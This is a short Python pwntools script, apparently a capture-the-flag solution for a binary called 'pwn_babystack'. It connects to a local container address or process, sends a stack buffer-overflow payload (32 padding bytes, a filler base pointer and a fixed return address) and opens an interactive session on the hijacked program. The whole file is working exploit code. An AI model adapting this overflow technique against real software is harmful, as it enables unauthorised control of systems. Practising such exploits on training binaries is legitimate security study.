#coding = utf-8
#author = ywledoc

from pwn import *
import sys

if sys.argv[1] == '1':
    p = remote("172.17.0.2",  10000)
else:
    p = process("./pwn_babystack")

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level = "debug"
#gdb.attach(proc.pidof(p)[0])

elf = ELF("./pwn_babystack")
system_addr = elf.symbols["system"]
print(hex(system_addr))

#pause()
payload = "a" * 32 + p64(0xdeadbeef) + p64(0x401153)
p.sendline(payload)

p.interactive()
